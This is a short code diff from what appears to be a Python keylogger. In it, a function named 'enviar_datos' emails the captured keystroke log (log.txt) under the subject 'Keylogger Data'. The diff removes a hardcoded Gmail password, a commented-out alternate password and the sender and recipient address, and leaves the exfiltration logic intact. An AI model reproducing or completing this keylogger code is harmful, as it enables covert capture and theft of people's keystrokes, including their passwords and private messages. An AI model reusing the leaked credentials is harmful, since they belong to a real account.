@@ -15,9 +15,9 @@ log_file = open("log.txt", "w+")
 
 def enviar_datos():
     msg = MIMEMultipart()
-    password = "mjzrhynqxippsthx"#"keyloger2097kaitext"
-    msg['From'] = "key47502@gmail.com"
-    msg['To'] = "key47502@gmail.com"
+    password = ""
+    msg['From'] = ""
+    msg['To'] = ""
     msg['Subject'] = "Keylogger Data"
     msg.attach(MIMEText(open('log.txt').read()))
     #Capturar errores#
